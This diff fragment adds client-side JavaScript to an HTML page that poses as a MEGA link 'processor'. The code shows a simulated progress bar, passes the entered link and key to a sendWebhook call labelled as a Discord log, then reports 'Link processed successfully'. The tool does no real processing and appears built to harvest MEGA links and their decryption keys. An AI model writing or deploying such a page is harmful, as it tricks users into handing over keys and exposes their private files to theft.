+            result.style.display =
+              "block";
+
+            resultTitle.textContent =
+              "⚠️ Missing Link";
+
+            resultTitle.style.color =
+              "#ff6b6b";
+
+            resultText.textContent =
+              "Please enter a MEGA link.";
+
+            resultText.className =
+              "result-text error";
+
+            return;
+          }
+
+
+          // -----------------------------------------------------
+          // RESET UI
+          // -----------------------------------------------------
+
+          processButton.disabled =
+            true;
+
+          processButton.textContent =
+            "Processing...";
+
+
+          // -----------------------------------------------------
+          // SIMULATE PROCESSING
+          // -----------------------------------------------------
+
+          await simulateProgress();
+
+
+          // -----------------------------------------------------
+          // SEND DISCORD LOG
+          // -----------------------------------------------------
+
+          const webhookSent =
+            await sendWebhook(
+              link,
+              key
+            );
+
+
+          // -----------------------------------------------------
+          // DISPLAY RESULT
+          // -----------------------------------------------------
+
+          result.style.display =
+            "block";
+
+
+          const isMegaFormat =
+            /(^|\/\/)(www\.)?mega\.nz\//i
+              .test(link);
+
+
+          if (isMegaFormat) {
+
+            resultTitle.textContent =
+              "✓ Link Processed";
+
+            resultTitle.style.color =
+              "#4ade80";
+
+            resultText.className =
+              "result-text";
+
+            resultText.textContent =
+              webhookSent
+                ? "Link processed successfully."
+                : "Link processed successfully. Logging service unavailable.";
+
+          } else {
+
+            resultTitle.textContent =
+              "⚠️ Link Processed (non-standard format)";
+
+            resultTitle.style.color =
+              "#ffb347";
+
+            resultText.className =
+              "result-text";
+
+            resultText.textContent =
+              webhookSent
+                ? "The link was processed but does not match the standard MEGA format."
+                : "The link was processed, but the logging service is unavailable.";
+
+          }
+
+
+          // -----------------------------------------------------
+          // RESTORE BUTTON
+          // -----------------------------------------------------
+
+          processButton.disabled =
+            false;
+
+          processButton.textContent =
+            "Process Link";
+
+        }
+      );
+
+
+      // =========================================================
+      // INITIAL STATE
+      // =========================================================
+
+      progressArea.style.display =
+        "none";
+
+      result.style.display =
+        "none";
+
+    })();
+  </script>
+
 </body>
 </html>
